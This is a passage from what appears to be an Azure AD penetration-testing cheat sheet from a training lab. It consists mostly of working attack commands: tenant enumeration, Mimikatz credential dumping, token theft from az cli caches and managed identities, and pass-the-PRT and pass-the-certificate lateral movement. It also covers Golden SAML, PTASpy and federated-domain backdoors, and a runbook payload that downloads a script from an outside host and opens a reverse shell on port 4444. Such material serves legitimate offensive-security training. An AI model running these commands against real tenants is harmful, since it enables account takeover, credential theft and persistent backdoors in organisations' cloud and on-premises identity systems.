$URI = '<https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01>'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value
```

**List all enterprise applications**

```
$Token = 'ey..'
$URI = '<https://graph.microsoft.com/v1.0/applications>'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value
```

**List all the groups, administrative units of a user**

```
$Token = 'eyJ0..'
$URI =
'<https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberOf>'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

## **Tools**

### **Roadtools**

[https://github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)

- Enumeration using RoadRecon includes three steps – Authentication – Data Gathering – Data Exploration

**roadrecon supports username/password, access and refresh tokens, device code flow (sign-in from another device) and PRT cookie.**

```
cd C:\\AzAD\\Tools\\ROADTools
pipenv shell
roadrecon auth -u <USERNAME> -p <PASSWORD>
```

**Gather information**

```
roadrecon gather
```

**Start roadrecon gui**

```
roadrecon gui
```

### **Stormspotter**

[https://github.com/Azure/Stormspotter](https://github.com/Azure/Stormspotter)

**Start the backend service**

```
cd C:\\AzAD\\Tools\\stormspotter\\backend\\
pipenv shell
python ssbackend.pyz
```

**Start the frontend server**

```
cd C:\\AzAD\\Tools\\stormspotter\\frontend\\dist\\spa\\
quasar.cmd serve -p 9091 --history
```

**Collect data**

```
cd C:\\AzAD\\Tools\\stormspotter\\stormcollector\\
pipenv shell
az login -u <USERNAME> -p <PASSWORD>
python C:\\AzAD\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli
```

**Check data**

- Log-on to the webserver at [http://localhost:9091](http://localhost:9091/). creds = neo4j:BloodHound
- After login, upload the ZIP archive created by the collector.
- Use the built-in queries to visualize the data.

### **Bloodhound / Azurehound**

- [https://github.com/BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound)
- More queries: [https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/](https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/)

**Run the collector to collect data**

```
import-module .\\AzureAD.psd1

$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds

. C:\\AzAD\\Tools\\AzureHound\\AzureHound.ps1
Invoke-AzureHound -Verbose
```

**Change object ID's to names in Bloodhound**

```
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
```

**Find all users who have the Global Administrator role**

```
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
```

**Find all paths to an Azure VM**

```
MATCH p = (n)-[r]->(g: AZVM) RETURN p
```

**Find all paths to an Azure KeyVault**

```
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

**Find all paths to an Azure Resource Group**

```
MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
```

**Find Owners of Azure Groups**

`MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p`

## **Privilege escalation**

## **Privesc enumeration**

**When on a new machine**

**Get context of current user**

```
az ad signed-in-user show
Get-AzContext
```

**List all owned objects**

```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <ID>
```

**Get access token**

Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms

```
az account get-access-token
az account get-access-token --resource-type ms-graph
```

**General**

**List all accessible resources**

```
Get-AzResource
```

**Check if it can read any deployment**

```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

**Check role assignments on ResourceID**

```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

**Get the allowed actions on the role definition**

```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

**Add a user to a group**

- Required aad-graph token

```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

## **Automation account**

- Automation Account comes very handy in privilege escalation:
  - Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.
  - Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting.
  - Access to connections, key vaults from a runbook.
  - Ability to run commands on on-prem VMs if hybrid workers are in use.
  - Ability to run commands on VMs using DSC in configuration management.
  - A runbook often contains clear-text passwords for example psremoting!

**Get information on automation accounts**

```
az extension add --upgrade -n automation
az automation account list
```

**Get the tokens to use Az Powershell**

```
az account get-access-token
az account get-access-token --resource-type aad-graph

$accesstoken = ''
$aadtoken = ''

Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
```

**Get the role assigned of the automation accounts**

- Check for the Roledefinition
- Get the ID from az automation account list

```
Get-AzRoleAssignment -Scope <ID>
```

**Check if a hybrid worker is in use by the automation account**

```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <NAME> -ResourceGroupName <NAME>
```

**Import Powershell runbook**

```
Import-AzAutomationRunbook -Name student38 -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
```

**Contents off studentx.ps1 for reverse shell**

```
IEX (New-Object Net.Webclient).downloadstring("<http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1>")

reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4444
```

**Publish the automation runbook to the vm**

```
Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

**Start the runbook**

```
Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAME> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

**Extract credentials automation account**

```
Import-Module Microburst.psm1
Get-AzurePasswords
```

## **Command execution on a VM**

- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm

**Connect with Az Powershell**

```
$accesstoken = ''
Connect-AzAccount -AccessToken $accesstoken -AccountId <CLIENT ID OR EMAIL>
```

**Get more information about the VM (networkprofile)**

```
Get-AzVM -Name <VM NAME> -ResourceGroupName <RESOURCE GROUP NAME> | select -ExpandProperty NetworkProfile
```

**Get the network interface**

```
Get-AzNetworkInterface -Name <NETWORKINTERFACE>
```

**Query ID of public ip adress to get the public ip**

```
Get-AzPublicIpAddress -Name <ID OF PUBLIC IP ADRESSES IN IPCONFIGURATION>
```

**Check role assignments on the VM**

```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

**Check the allowed actions of the role definition**

```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

**Run a command on the VM**

```
Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
```

**Contents of adduser.ps1**

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USER> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```

**Access the VM**

```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password)
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

**Check for credentials in powershell history (Try other ways to tho!)**

```
cat C:\\Users\\bkpadconnect\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
cat C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```

## **Getting credentials**

### **Stealing tokens**

**Stealing tokens from az cli**

- az cli stores access tokens in clear text in `accessTokens.json` in the directory `C:\\Users\\<username>\\.Azure`
- We can read tokens from the file, use them and request new ones too!
- azureProfile.json in the same directory contains information about subscriptions.
- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
- To clear the access tokens, always use az logout

**Stealing tokens from az powershell**

- Az PowerShell stores access tokens in clear text in `TokenCache.dat` in the directory `C:\\Users\\<username>\\.Azure`
- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate.
- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
- Always use Disconnect-AzAccount!!

**Requesting tokens once logged in**

**AZ powershell**

- Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse

```
Get-AzAccessToken -ResourceTypeName AadGraph
```

**Azure CLI**

- Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms

```
az account get-access-token --resource-type ms-graph
```

### **Keyvault**

**Get keyvault access token**

```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

**Login to account with access tokens for keyvault**

```
$accesstoken = ''
$keyvaulttoken = ``

Connect-AzAccount -AccessToken $accesstoken -AccountId <ID> -KeyVaultAccessToken $keyvaulttoken
```

**List all keyvaults**

```
Get-AzKeyVault
```

**Get info about a specific keyvault**

```
Get-AzKeyVault -VaultName <VAULT NAME>
```

**List the saved creds from keyvault**

```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -AsPlainText
```

**Read creds from a keyvault**

```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
```

**Connect with the credentials found and enumerate further!**

```
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)

Connect-AzAccount -Credential $creds
```

### **Mimikatz**

```
Invoke-Mimikayz -Dumpcreds
```

**Dump service account passwords**

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

### **Powershell History**

```
Get-Childitem -Path C:\\Users\\ -Force -Include ConsoleHost_history -Recurse -ErrorAction SilentlyContinue
cat <FILE> | select-string password
cat <FILE> | select-string secure
```

### **Transcript**

```
type C:\\Transcripts\\20210422\\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```

## **Managed Identity**

**Check for managed identity**

- print environment variables and check for IDENTITY\_HEADER and IDENTITY\_ENDPOINT

```
env
```

**Request access token for managed identity**

```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

**Request access token for managed identity html file upload**

```
<?php

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

## **Reset password of other users**

- Reset password if user has "authentication administrator" role on a group or administrative unit.

```
$password = "<PASSWORD>" | ConvertTo-SecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<ACCOUNT>"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
```

## **Add credentials to enterprise applications**

**Check if secrets (application passwords) can be added to all enterprise applications**

```
. .\\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

**Use the secret to autheticate as service principal.**

```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

**Check what resources service principal can access**

```
Get-AzResource
```

## **Deployments**

**Check access to any resource group**

```
Get-AzResourceGroup
```

**Check if managed identity can read any deployment from the resource group:**

```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
```

**Save the deployment template**

```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
```

**Find passwords in the template**

- Or manually scan through it!

```
cat <PATH TO .json FILE> | Select-String password
```

## **Storage account**

**Check accessible resources**

```
Get-AzResource
```

**Check if there is a container that is acccessible**

```
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
```

**Check using the "Storage Explorer" application! Might be possible then!**

**Check if you can access storage account keys**

```
Get-AzStorageAccountKey -name <NAME OF STORAGE> -resourcegroupname <NAME>
```

**Access Storage Accounts AZ powershell**

```
Get-AzResource
Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

**Connect to the storage account with "Storage Explorer" using the account name and account keys**

## **Abusing dynamic groups**

- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.
- Login to the portal and check the groups. Is there any dynamic group?
- Click on the dynamic group and select "Dynamic membership rules". Is it possible to invite a user that complies to the rule?
- Go to Users and select "New Guest User"
- Open the user's profile and click on "(manage)" under invitation accepted. Select YES on resend invite and copy the URL.
- Open the URL in a private browser and login and accept the permissions.
- Connect to the tenant with AzureAD
- Set the secondary email for the user (Get the objectID of the user from the portal where we made the guest)

```
import-module .\\AzureADPreview.psd1
Get-AzureADMSGroup | Where-Object -Property GroupTypes -Match 'DynamicMembership' | fl *
```

```
Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
```

- Check if the user is added to the dynamic group (Might take a bit)

## **Arm Templates and Deployment History**

- Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
- Login to the azure portal
- Go to the deployments under settings and check the template for passwords or anything!
- Not sure if its possible by commands in any module!

## **Function apps continuous deployment**

- In case continuous deployment is used, a source code update triggers a deployment to Azure.
- Following source code locations are supported
  - Azure Repos
  - GitHub
  - Bitbucket
- May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!

## **Lateral movement**

## **Azure AD machine --> Azure (or another Azure AD Machine)**

### **Pass the certificate**

- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.

**Check if machine is Azure AD Joined**

- Check for IsDeviceJoined : YES

```
dsregcmd /status
```

**Extract PRT, Session key (keyvalue) and Tenant ID**

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

**Extract context key, clearkey and derived key**

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

**Request a certificate from PRT**

- [https://github.com/morRubin/PrtToCert](https://github.com/morRubin/PrtToCert)
- Code is modified in the lab

```
& 'C:\\Program Files\\Python39\\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
```

**Use certificate to add a user with administrative privileges**

- Code is modified in the lab
- [https://github.com/morRubin/AzureADJoinedMachinePTC](https://github.com/morRubin/AzureADJoinedMachinePTC)

```
python \\AzureADJoinedMachinePTC\\Main.py --usercert <PATH TO .pfx FILE> --certpass AzureADCert --remoteip <TARGET IP> --command "cmd.exe /c net user <USERNAME> <PASSWORD> /add /Y && net localgroup administrators <USERNAME> /add"
```

**Use psremoting to access the machine**

### **Pass the PRT**

**Extract PRT, Session key (keyvalue) and Tenant ID**

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

**Extract context key, clearkey and derived key**

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEY VALUE> /unprotect" "exit"'
```

**Request access token (cookie) to all applications**

```
Import-Module .\\AADInternals.psd1

$tempPRT = '<PRT>'
while($tempPRT.Length % 4) {$tempPRT += "="}
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($tempPRT))

$ClearKey = "<CLEARKEY>"
$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))

New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```

**Copy the value from above command and use it with a web browser**

- Open the Browser in Incognito mode
- Go to [https://login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf)
- Press F12 (Chrome dev tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for [https://login.microsoftonline.com](https://login.microsoftonline.com/) and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit [https://login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf) again and we will get access as the user!
- Can now also access [portal.azure.com](http://portal.azure.com/)

## **Azure AD --> On-prem**

### **Intune**

- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
- If user had Intune Administrator role go to [https://endpoint.microsoft.com/#home](https://endpoint.microsoft.com/#home) and login (or from a ticket (PRT)
- Go to Devices -> All Devices to check devices enrolled to Intune:
- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
- Example script adduser.ps1

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USERNAME> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member <USERNAME>
```

- Select `Run script in 64 bit PowerShell Host`
- On the assignment page select "Add all users" and "add all devices"

### **Application proxy abuse**

- The application behind the proxy may have vulnerabilities to access the on-prem environment.

**Enumerate application which has a application proxy configured**

```
Import-Module .\\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

**Get the Service Principal (use the application name)**

```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"}
```

**Find user and groups assigned to the application**

```
. .\\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

**Extract secrets of service account**

- After compromising the application

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

## **On-Prem --> Azure AD**

### **Azure AD Connect**

- Check if there is an account name with `MSOL_<INSTALLATION ID>`. This user has DCSYNC rights. (or `AAD_` if installed on a DC)
- Command to check if AD connect is installed on the server `Get-ADSyncConnector`

#### **Password Hash Sync Abuse**

- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.

**Enumerate server where Azure AD is installed (on prem command)**

```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

**Enumerate server where Azure AD is installed (Azure command)**

```
Import-Module .\\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

**Extract credentials from the server**

```
Import-Module .\\AADInternals.psd1
Get-AADIntSyncCredentials
```

*Run DCSync with creds of MSOL\_ account*\*

```
runas /netonly /user:<DOMAIN>\\MSOL_<ID> cmd
Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
```

**Reset password of any user**

- Using the Sync\_\* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

**Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.**

```
Import-Module .\\AADInternals.psd1
$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

**Enumerate global admin**

```
Get-AADIntGlobalAdmins
```

**Get the ImmutableID**

```
Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
```

**Reset the Azure password**

```
Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Verbose
```

**Reset password for cloud only user**

- Need CloudAnchor ID which is the format `<USER>_<OBJECTID>`

```
Import-Module .\\AADInternals.psd1
 Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
```

- Access Azure portal using the new password.

#### **Pass Through Authentication (PTA) Abuse**

- Once we have admin access to an Azure AD connect server running PTA agent.
- Not reliable method to check if PTA is used, Check if module is available `Get-Command -Module PassthroughAuthPSModule`
- Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!

**Install a backdoor (needs to be run ad administrator)**

```
Import-Module .\\AADInternals.psd1
Install-AADIntPTASpy
```

**See passwords of on-prem users authenticating**

- Stored in C:\\PTASpy

```
Get-AADIntPTASpyLog -DecodePasswords
```

**Register a new PTA agent**

- After getting Global Administrator privileges by setting it on a attacker controled machine.

```
Import-Module .\\AADInternals.psd1
Install-AADIntPTASpy
```

#### **Federation (ADFS)**

- Golden SAML Attack

**Get the ImmutableID**

```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

**On ADFS server (As administrator)**

```
Get-AdfsProperties | select identifier
```

**Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)**

```
Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
```

**Extract the ADFS token signing certificate**

- With DA privileges on-prem

```
Import-Module .\\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

**Access cloud apps as any user**

```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName C:\\users\\adfsadmin\\Documents\\ADFSSigningCertificate.pfx -Verbose
```

**With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!**

**Create a realistic ImmutableID**

```
[System.Convert]::ToBase64String((New-Guid).tobytearray())
```

**Export the token signing certificate**

```
Import-Module .\\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

**Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified**

```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName <PATH TO .pfx FILE> -Verbose
```

## **Persistence**

- It is recommended by Microsoft to join the Azure AD Connect server to the on-prem AD.
- This means that the persistence mechanisms for on-prem (like Golden Ticket, Silver Ticket, ACL Backdoors and others) that provide us either DA on the on-prem or local admin on the Azure AD connect server will allow to get GA on Azure AD on demand!
  - For PHS, we can extract the credentials
  - For PTA, we can install the agent
  - For Federation, we can extract the certificate from ADFS server using DA

## **Hybrid identity - Seamless SSO**

- Seamless SSO is supported by both PHS and PTA.
- If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.
- Password/key of the AZUREADSSOACC never changes.

**Get NTLM hash of AZUREADSSOC account**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\\azureadssoacc$ /domain:<DOMAIN> /dc:<DC NAME>"'
```

**Create a silver ticket**

```
Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /sid:<SID> /id:1108 /domain:<DOMAIN> /rc4:<HASH> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

## **Add credentials to enterprise applications**

**Check if secrets (application passwords) can be added to all enterprise applications**

```
. .\\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

**Use the secret to autheticate as service principal.**

```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### **Check what resources service principal can access**

```
Get-AzResource
```

## **Federation**

### **Creating a trusted domain**

If we have GA privileges on a tenant, we can add a new domain (must be verified), configure its authentication type to Federated and configure the domain to trust a specific certificate (any.sts in the below command) and issuer.

#### **Add a domain with AADInternal**

```
Import-Module .\\AADInternals.psd1
ConvertTo-AADIntBackdoor -DomainName <DOMAIN>
```

#### **Get immutableID of the user that we want to impersonate. Using Msol module**

```
Get-MsolUser | select userPrincipalName,ImmutableID
```

#### **Access any cloud app as the user**

```
Open-AADIntOffice365Portal -ImmutableID <ID> -Issuer "<http://any.sts/B231A11F>" -UseBuiltInCertificate -ByPassMFA $true
```

### **Token Signing Certificate**

- With DA privileges on on-prem AD, it is possible to create and import new Token signing and Token Decrypt certificates that have a very long validity.

#### **Create new certs, add them to ADFS, Disable auto reollver and restart the service**

```
Import-Module .\\AADInternals.psd1
New-AADIntADFSSelfSignedCertificates
```

#### **Update the certificate information with AzureAD**

```
Update-AADIntADFSFederationSettings -Domain <DOMAIN>
```

## **Storage account access keys**

- We already know that keys provide root equivalent privileges on an storage account.
- There are two access keys and they are NOT rotated automatically (unless a key vault is managing the keys).
- This, of course, provides neat persistent access to the storage account.
- We can also generate SAS URL (including offline minting) using the access keys.

## **Application and service principals**

- With privileges of Application Administrator, GA or a custom role with microsoft.directory/applications/credentials/update permissions, we can add credentials (secret or certificate) to an existing application.
- We can also add a new application that has high permissions and then use that for persistence.
- If we have GA privileges, we can create an application with the Privileged authentication administrator role - that allows to reset password of Global Administrators.

#### **Sign in as a service principal account**

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<ACCOUNT ID>", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant <ID>
```

#### **For certificate based authentication**

```
Connect-AzAccount -ServicePrincipal -Tenant <ID> -
CertificateThumbprint <Thumbprint> -ApplicationId <ID>
```

## **Illicit Consent Grant**

- We can register an application (only for the target tenant) that needs high impact permissions with admin consent - like sending mail on a user's behalf, role management etc.

## **Azure VMs and NSGs**

- OS level persistence on an Azure VM where we have remote access is very useful.
- Azure VMs also support managed identity so persistence on any such VM will allow us access to additional Azure resources.
- We can also create snapshot of disk attached to a running VM. This can be used to extract secrets stored on disk (like SAM hive for Windows).
- It is also possible to attach a modified/tampered disk to a turned-off VM. For example, add a local administrator!
- Couple this with modification of NSGs to allow access from IPs that we control!

## **Custom Azure AD roles**

- If we have GA in a tenant, we can modify a custom role and assign that to a user that we control.
- Take a look at the permissions of the built-in administrative roles, we can pick individual actions. It is always helpful to go for minimal privileges.

## **Deployment Modification**

- If we have persistent access to external resources like GitHub repos that are a part of deployment chain, it will be possible to persist in the target tenant.

{% endraw %}
